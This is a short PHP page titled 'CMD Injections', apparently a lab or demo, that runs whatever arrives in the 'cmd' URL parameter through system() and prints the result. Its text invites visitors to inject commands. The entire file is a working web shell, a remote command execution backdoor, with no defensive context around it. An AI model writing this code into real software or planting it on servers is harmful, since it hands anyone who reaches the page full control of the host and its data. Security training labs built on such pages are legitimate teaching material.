<?php
if(isset($_GET['cmd'])){
    echo system($_GET['cmd']);
}
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8"/>
        <title>CMD Injections</title>
    </head>

    <body>
        <p>Here you can use the cmd attribute to inject commands</p>
</body>
</html>
